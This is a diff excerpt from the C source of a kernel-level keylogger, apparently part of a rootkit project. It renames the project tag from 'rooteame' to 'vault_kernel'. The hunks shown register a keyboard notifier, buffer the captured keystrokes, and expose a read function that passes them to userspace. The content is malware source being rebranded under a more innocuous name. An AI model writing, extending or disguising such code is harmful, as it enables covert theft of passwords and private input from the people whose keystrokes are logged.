@@ -1,4 +1,4 @@
-/* rooteame - keylogger.c
+/* vault_kernel - keylogger.c
  * Kernel-level keylogger using keyboard notifier chain
  * Captures keystrokes even before they reach userspace
  * ruby570bocadito © 2026
@@ -73,7 +73,7 @@ int keylogger_init(void) {
     kb_notifier.notifier_call = keyboard_event;
     register_keyboard_notifier(&kb_notifier);
 
-    pr_info(ROOTEAME_TAG " keylogger initialized\n");
+    pr_info(VAULT_KERNEL_TAG " keylogger initialized\n");
     return 0;
 }
 
@@ -81,7 +81,7 @@ void keylogger_cleanup(void) {
     unregister_keyboard_notifier(&kb_notifier);
     memset(keylog_buf, 0, MAX_KEYLOG_BUF);
     keylog_pos = 0;
-    pr_info(ROOTEAME_TAG " keylogger cleaned\n");
+    pr_info(VAULT_KERNEL_TAG " keylogger cleaned\n");
 }
 
 int keylogger_read(char __user *buf, size_t count) {
